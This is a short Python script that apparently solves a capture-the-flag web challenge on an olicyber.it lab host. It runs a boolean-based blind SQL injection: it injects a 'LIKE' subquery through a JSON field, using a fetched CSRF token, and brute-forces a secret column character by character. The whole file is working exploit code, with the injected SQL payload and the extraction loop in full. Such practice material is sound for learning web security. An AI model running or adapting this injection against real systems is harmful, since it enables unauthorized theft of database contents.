import requests

url = 'http://web-17.challs.olicyber.it'
alpha = '0123456789abcdef'
sess = requests.Session()
csrf = sess.get(url + '/api/get_token')
headers = {
        'X-CSRFToken' : csrf.json()['token']
    }
flag = ''
while True:
    for i in alpha:
        data = {'query' : f"1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{flag + i}%')=1 -- "}
        resp = sess.post(url + '/api/blind', json=data, headers=headers)
        if resp.json()['result'] == 'Success':
            flag += i
            i = alpha[0]
            break
    else:
        break
print(bytes.fromhex(flag).decode())